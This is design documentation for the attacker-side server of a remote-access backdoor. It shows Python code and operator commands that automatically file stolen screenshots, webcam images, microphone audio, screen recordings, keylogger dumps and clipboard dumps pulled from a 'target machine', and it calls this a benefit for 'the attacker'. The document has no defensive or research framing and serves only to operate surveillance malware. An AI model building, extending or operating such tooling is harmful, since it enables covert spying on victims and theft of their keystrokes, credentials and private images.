# Download Organization Implementation

## Overview

This document explains the automatic file organization system for downloads from the target machine to the attacker machine.

## Attacker/Server-Side Download Organization (`server.py`)

#### Function: `_get_local_download_path()`

This helper function automatically determines the correct local directory for downloaded files based on their type:

```python
def _get_local_download_path(self, remote_file):
    """Determine the local download path based on remote file path"""
    filename = os.path.basename(remote_file)

    # Auto-routing logic:
    if 'logs/screenshots' in remote_file or 'screenshot' in filename:
        return os.path.join('logs', 'screenshots', filename)
    elif 'logs/audio' in remote_file or (filename.startswith('audio_') and filename.endswith('.wav')):
        return os.path.join('logs', 'audio', filename)
    elif 'logs/recordings' in remote_file or 'screen_recording' in filename or 'recording' in filename:
        return os.path.join('logs', 'recordings', filename)
    elif 'logs/webcam' in remote_file or 'webcam' in filename:
        return os.path.join('logs', 'webcam', filename)
    elif 'logs/keylog' in remote_file or 'keylog' in filename:
        return os.path.join('logs', 'keylog', filename)
    elif 'logs/clipboard' in remote_file or 'clipboard' in filename:
        return os.path.join('logs', 'clipboard', filename)
    else:
        return filename  # Default: current directory
```

#### `download_file()` Function

The download function:

1. Determines the correct local path using `_get_local_download_path()`
2. Creates the directory structure if it doesn't exist
3. Saves the file to the appropriate folder

```python
def download_file(self, file_name):
    local_file = self._get_local_download_path(file_name)
    os.makedirs(os.path.dirname(local_file), exist_ok=True)
    # ... download and save to local_file
```

## File Organization Structure

When files are downloaded from the target to the attacker machine, they are automatically organized into this structure:

```
attacker_machine/
├── logs/
│   ├── audio/              # Audio recordings (*.wav)
│   │   └── audio_YYYYMMDD_HHMMSS.wav
│   ├── clipboard/          # Clipboard dumps (*.txt)
│   │   └── clipboard_dump_YYYYMMDD_HHMMSS.txt
│   ├── keylog/            # Keylogger dumps (*.txt)
│   │   └── keylog_dump_YYYYMMDD_HHMMSS.txt
│   ├── recordings/        # Screen recordings (*.mp4, *.avi, *.mkv)
│   │   └── screen_recording_YYYYMMDD_HHMMSS.mp4
│   ├── screenshots/       # Screenshots (*.png)
│   │   └── screenshot_YYYYMMDD_HHMMSS.png
│   └── webcam/           # Webcam captures (*.jpg)
│       └── webcam_YYYYMMDD_HHMMSS.jpg
└── server.py
```

## Usage Examples

### Automatic Organization

1. **Download Screenshot:**

   ```
   [target]> download logs/screenshots/screenshot_20241004_123456.png
   [+] File downloaded: logs/screenshots/screenshot_20241004_123456.png
   ```

2. **Download Audio Recording:**

   ```
   [target]> download logs/audio/audio_20241004_123456.wav
   [+] File downloaded: logs/audio/audio_20241004_123456.wav
   ```

3. **Download Screen Recording:**

   ```
   [target]> download logs/recordings/screen_recording_20241004_123456.mp4
   [+] File downloaded: logs/recordings/screen_recording_20241004_123456.mp4
   ```

4. **Download Webcam Image:**

   ```
   [target]> download logs/webcam/webcam_20241004_123456.jpg
   [+] File downloaded: logs/webcam/webcam_20241004_123456.jpg
   ```

5. **Keylog Dump (Automatic):**

   ```
   [target]> keylog_dump
   Keylog file ready: logs/keylog/keylog_20241004_123456.txt
   [*] Downloading keylog file...
   [+] Keylog file downloaded: logs/keylog/keylog_dump_20241004_123456.txt
   === Keylog Content ===
   ...
   ```

6. **Clipboard Dump (Automatic):**
   ```
   [target]> clipboard_dump
   Clipboard log file ready: logs/clipboard/clipboard_20241004_123456.txt
   [*] Downloading clipboard log file...
   [+] Clipboard log file downloaded: logs/clipboard/clipboard_dump_20241004_123456.txt
   === Clipboard Log Content ===
   ...
   ```

## File Type Detection

The system uses multiple methods to determine the correct folder:

1. **Path-based detection**: Checks if the remote file path contains specific folder names (e.g., `logs/screenshots`)
2. **Filename-based detection**: Analyzes the filename pattern (e.g., `screenshot_`, `audio_`, `webcam_`)
3. **Extension-based detection**: Checks file extensions (e.g., `.wav` for audio, `.png` for screenshots)

## Benefits

1. **Automatic Organization**: Files are automatically sorted into appropriate folders
2. **No Manual Work**: The attacker doesn't need to manually move or organize files
3. **Consistent Structure**: Maintains the same folder structure as on the target machine
4. **Easy Navigation**: Files are easy to find in their respective categories
5. **Clean Workspace**: Prevents cluttering the main directory with downloaded files

## Backward Compatibility

- Files that don't match any known pattern are saved to the current directory
- This ensures that custom downloads still work as expected
- Existing functionality is preserved while adding automatic organization

## Notes

- Directories are created automatically if they don't exist
- Timestamps ensure unique filenames and prevent overwrites
- The system works for both manual downloads and automatic dumps
- All download operations include proper error handling

# Download Organization Flow Diagram

## System Architecture

```
┌─────────────────────────────────────────────────────────────────────┐
│                         TARGET MACHINE                               │
│  ┌──────────────────────────────────────────────────────────────┐  │
│  │                    File Generation                            │  │
│  │                                                               │  │
│  │  Screenshots  ──→  logs/screenshots/screenshot_*.png         │  │
│  │  Audio Rec    ──→  logs/audio/audio_*.wav                   │  │
│  │  Recordings   ──→  logs/recordings/screen_recording_*.mp4   │  │
│  │  Webcam       ──→  logs/webcam/webcam_*.jpg                 │  │
│  │  Keylog       ──→  logs/keylog/keylog_*.txt                 │  │
│  │  Clipboard    ──→  logs/clipboard/clipboard_*.txt           │  │
│  └──────────────────────────────────────────────────────────────┘  │
│                              ↓                                       │
│                    Network Transfer (Socket)                         │
└─────────────────────────────────────────────────────────────────────┘
                               ↓
┌─────────────────────────────────────────────────────────────────────┐
│                      ATTACKER MACHINE                                │
│  ┌──────────────────────────────────────────────────────────────┐  │
│  │                  Server Download Handler                      │  │
│  │                                                               │  │
│  │  1. Receive file from target                                │  │
│  │  2. Call _get_local_download_path(filename)                 │  │
│  │  3. Analyze filename and path                               │  │
│  │  4. Determine correct logs/ subdirectory                    │  │
│  │  5. Create directory if needed (os.makedirs)                │  │
│  │  6. Save file to organized location                         │  │
│  └──────────────────────────────────────────────────────────────┘  │
│                              ↓                                       │
│  ┌──────────────────────────────────────────────────────────────┐  │
│  │              Organized File Structure                         │  │
│  │                                                               │  │
│  │  logs/screenshots/  ──→  screenshot_*.png                   │  │
│  │  logs/audio/        ──→  audio_*.wav                        │  │
│  │  logs/recordings/   ──→  screen_recording_*.mp4             │  │
│  │  logs/webcam/       ──→  webcam_*.jpg                       │  │
│  │  logs/keylog/       ──→  keylog_dump_*.txt                  │  │
│  │  logs/clipboard/    ──→  clipboard_dump_*.txt               │  │
│  └──────────────────────────────────────────────────────────────┘  │
└─────────────────────────────────────────────────────────────────────┘
```

## File Type Detection Flow

```
┌─────────────────────────────────────┐
│  File Download Request Received     │
│  (filename from target)             │
└────────────────┬────────────────────┘
                 ↓
┌─────────────────────────────────────┐
│  _get_local_download_path()         │
│  Extract basename from path         │
└────────────────┬────────────────────┘
                 ↓
         ┌───────┴───────┐
         │  File Type    │
         │  Detection    │
         └───────┬───────┘
                 ↓
    ┌────────────┴────────────┐
    │                         │
    ↓                         ↓
┌─────────┐              ┌─────────┐
│  Path   │              │ Pattern │
│ Check   │       OR     │  Check  │
└────┬────┘              └────┬────┘
     │                        │
     │  Contains             │  Starts with
     │  'logs/screenshots'?  │  'screenshot_'?
     │  'logs/audio'?        │  'audio_'?
     │  'logs/recordings'?   │  'screen_recording'?
     │  'logs/webcam'?       │  'webcam_'?
     │  'logs/keylog'?       │  'keylog'?
     │  'logs/clipboard'?    │  'clipboard'?
     │                        │
     └────────────┬───────────┘
                  ↓
         ┌────────┴────────┐
         │   YES           │   NO
         │   ↓             │   ↓
         │ Return          │ Return
         │ logs/X/file     │ file (current dir)
         └─────────────────┘
                  ↓
         ┌────────┴────────┐
         │  Create dir     │
         │  if not exists  │
         │  os.makedirs()  │
         └────────┬────────┘
                  ↓
         ┌────────┴────────┐
         │  Save file to   │
         │  determined     │
         │  location       │
         └─────────────────┘
```

## Command Flow Examples

### Example 1: Screenshot Download

```
Attacker: screenshot
   ↓
Target: Captures screen → saves to logs/screenshots/screenshot_20241004_123456.png
   ↓
Attacker: screenshot_list
   ↓
Target: Returns list of files in logs/screenshots/
   ↓
Attacker: download logs/screenshots/screenshot_20241004_123456.png
   ↓
Server._get_local_download_path() detects 'screenshot' pattern
   ↓
Returns: logs/screenshots/screenshot_20241004_123456.png
   ↓
Creates: logs/screenshots/ directory (if needed)
   ↓
Saves file to: logs/screenshots/screenshot_20241004_123456.png
   ↓
Output: [+] File downloaded: logs/screenshots/screenshot_20241004_123456.png
```

### Example 2: Keylog Dump (Automatic)

```
Attacker: keylog_dump
   ↓
Target: Checks logs/keylog/keylog_20241004_123456.txt
   ↓
Target: Sends message "Keylog file ready: logs/keylog/keylog_20241004_123456.txt"
   ↓
Target: Automatically sends file content
   ↓
Server: Receives confirmation message
   ↓
Server: Creates logs/keylog/keylog_dump_20241004_123456.txt path
   ↓
Server: Creates logs/keylog/ directory (if needed)
   ↓
Server: Receives and saves file
   ↓
Server: Displays file content in terminal
   ↓
Output: [+] Keylog file downloaded: logs/keylog/keylog_dump_20241004_123456.txt
        === Keylog Content ===
        [content here]
        === End of Keylog ===
```

## Directory Auto-Creation Logic

```
Before Download:
attacker_machine/
├── server.py
├── backdoor.py
└── (no logs/ directory)

After First Screenshot Download:
attacker_machine/
├── server.py
├── backdoor.py
└── logs/
    └── screenshots/
        └── screenshot_20241004_123456.png

After First Audio Download:
attacker_machine/
├── server.py
├── backdoor.py
└── logs/
    ├── screenshots/
    │   └── screenshot_20241004_123456.png
    └── audio/
        └── audio_20241004_123456.wav

After All Types Downloaded:
attacker_machine/
├── server.py
├── backdoor.py
└── logs/
    ├── audio/
    │   └── audio_20241004_123456.wav
    ├── clipboard/
    │   └── clipboard_dump_20241004_123456.txt
    ├── keylog/
    │   └── keylog_dump_20241004_123456.txt
    ├── recordings/
    │   └── screen_recording_20241004_123456.mp4
    ├── screenshots/
    │   └── screenshot_20241004_123456.png
    └── webcam/
        └── webcam_20241004_123456.jpg
```

## Pattern Matching Table

| File Type  | Path Contains    | Filename Pattern    | Extension | Destination       |
| ---------- | ---------------- | ------------------- | --------- | ----------------- |
| Screenshot | logs/screenshots | screenshot\_\*      | .png      | logs/screenshots/ |
| Audio      | logs/audio       | audio\_\*           | .wav      | logs/audio/       |
| Recording  | logs/recordings  | screen*recording*\* | .mp4      | logs/recordings/  |
| Webcam     | logs/webcam      | webcam\_\*          | .jpg      | logs/webcam/      |
| Keylog     | logs/keylog      | keylog\*            | .txt      | logs/keylog/      |
| Clipboard  | logs/clipboard   | clipboard\*         | .txt      | logs/clipboard/   |
| Unknown    | -                | -                   | -         | current dir       |

## Error Handling Flow

```
┌─────────────────────────────────────┐
│  Download Attempt                   │
└────────────────┬────────────────────┘
                 ↓
         ┌───────┴───────┐
         │  Try Block    │
         └───────┬───────┘
                 ↓
         Path Determination
                 ↓
         Directory Creation
                 ↓
         File Download
                 ↓
         File Save
                 ↓
    ┌────────────┴────────────┐
    │ Success                 │ Error
    ↓                         ↓
┌─────────┐           ┌──────────────┐
│ Print   │           │ Catch        │
│ Success │           │ Exception    │
│ Message │           └──────┬───────┘
└─────────┘                  ↓
                     ┌───────┴───────┐
                     │ Print Error   │
                     │ Message       │
                     └───────────────┘
```

## Benefits Visualization

```
BEFORE (Old System):
attacker_machine/
├── server.py
├── backdoor.py
├── screenshot_1.png          ← Messy!
├── screenshot_2.png
├── audio_1.wav
├── keylog_dump.txt
├── webcam_1.jpg
└── screen_recording_1.mp4

AFTER (New System):
attacker_machine/
├── server.py
├── backdoor.py
└── logs/                     ← Organized!
    ├── screenshots/
    │   ├── screenshot_1.png
    │   └── screenshot_2.png
    ├── audio/
    │   └── audio_1.wav
    ├── keylog/
    │   └── keylog_dump.txt
    ├── webcam/
    │   └── webcam_1.jpg
    └── recordings/
        └── screen_recording_1.mp4
```
